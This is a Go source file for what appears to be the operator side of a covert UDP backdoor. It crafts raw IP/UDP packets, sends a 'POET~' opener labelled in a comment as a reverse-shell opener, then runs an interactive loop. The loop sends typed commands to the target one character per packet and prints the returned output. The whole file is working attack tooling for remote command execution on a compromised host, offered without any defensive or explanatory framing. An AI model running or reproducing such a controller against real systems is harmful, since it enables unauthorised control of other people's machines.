package main

import (
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const (
	CONN_PORT = "5858"
	CONN_TYPE = "udp"
)

func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
	var (
		ief      *net.Interface
		addrs    []net.Addr
		ipv4Addr net.IP
	)
	if ief, err = net.InterfaceByName(interfaceName); err != nil { // get interface
		return
	}
	if addrs, err = ief.Addrs(); err != nil { // get addresses
		return
	}
	for _, addr := range addrs { // get ipv4 address
		if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
			break
		}
	}
	if ipv4Addr == nil {
		return "", errors.New(fmt.Sprintf("interface %s don't have an ipv4 address\n", interfaceName))
	}
	return ipv4Addr.String(), nil
}

func open(ifName string) (net.PacketConn, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return nil, fmt.Errorf("Failed open socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW): %s", err)
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	if ifName != "" {
		_, err := net.InterfaceByName(ifName)
		if err != nil {
			return nil, fmt.Errorf("Failed to find interface: %s: %s", ifName, err)
		}
		syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, ifName)
	}

	conn, err := net.FilePacketConn(os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd)))
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func buildUDPPacket(dst, src *net.UDPAddr, command string) ([]byte, error) {
	buffer := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload(command)
	ip := &layers.IPv4{
		DstIP:    dst.IP,
		SrcIP:    src.IP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(src.Port),
		DstPort: layers.UDPPort(dst.Port),
	}
	if err := udp.SetNetworkLayerForChecksum(ip); err != nil {
		return nil, fmt.Errorf("Failed calc checksum: %s", err)
	}
	if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}, ip, udp, payload); err != nil {
		return nil, fmt.Errorf("Failed serialize packet: %s", err)
	}
	return buffer.Bytes(), nil
}

func sendUDPPacket(iFace string, source string, target string, command string, sport int, dport int) {
	conn, err := open(iFace)
	if err != nil {
		panic(err)
	}
	dst := &net.UDPAddr{
		IP:   net.ParseIP(target),
		Port: dport,
	}
	if sport != 77 {
		for _, c := range command {
			udpHelper(conn, dst, source, sport, string(c)) // send char by char
		}
		udpHelper(conn, dst, source, sport, "\n") // send newline char
	} else {
		udpHelper(conn, dst, source, sport, command) // send revshell opener
	}
	return
}

func udpHelper(conn net.PacketConn, dst *net.UDPAddr, source string, sport int, data string) {
	fmt.Printf("Data: %s\n", data)
	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(source), Port: sport}, data)
	if err != nil {
		panic(err)
	}
	_, err = conn.WriteTo(b, &net.IPAddr{IP: dst.IP})
	if err != nil {
		panic(err)
	}
}

func readBuffer(pc net.PacketConn, addrChan chan net.Addr) {
	buffer := make([]byte, 2048)
	for {
		numBytesRead, addr, err := pc.ReadFrom(buffer)
		if err != nil {
			panic(err)
		}
		fmt.Printf("ALL-BUFFER: %s\n", string(buffer)) // DEBUG
		if numBytesRead > 1 {
			fmt.Printf("MAIN-BUFFER: %s\n", string(buffer)) // print output
			addrChan <- addr
		} else {
			fmt.Printf("DEL: %s\n", string(buffer))
		}
		buffer = buffer[:0] // zero out buffer each time

	}
}

func main() {
	var iFace string
	var source string
	var command string
	var target string

	iFace, ok := os.LookupEnv("IFACE")
	if !ok {
		fmt.Printf("IFACE environment variable not set\n")
		return
	}

	flag.StringVar(&target, "t", "127.0.0.1", "IP address to target")

	flag.Parse()

	if target == "127.0.0.1" {
		flag.Usage()
		return
	}

	source, err := GetInterfaceIpv4Addr(iFace)
	if err != nil {
		panic(err)
		return
	}

	opener := "POET~" + target
	sendUDPPacket(iFace, source, target, opener, 77, 7714)

	pc, err := net.ListenPacket("udp", source+":"+CONN_PORT)
	if err != nil {
		panic(err)
		return
	}
	defer pc.Close()

	addrChan := make(chan net.Addr, 1)

	go readBuffer(pc, addrChan)
	for {
		select {
		case <-addrChan:
			fmt.Printf("in addrchan\n")
			addr := <-addrChan
			dport := addr.(*net.UDPAddr).Port

			deadline := time.Now().Add(60 * time.Second)
			err = pc.SetWriteDeadline(deadline)
			if err != nil {
				return
			}

			fmt.Print("Command: ")
			fmt.Scanf("%s", &command)
			if command == "exit" {
				return
			}

			sendUDPPacket(iFace, source, target, command, 5858, dport)

			addrChan <- nil
		default:
			time.Sleep(1 * time.Second) // do nothing
		}
	}
	return
}
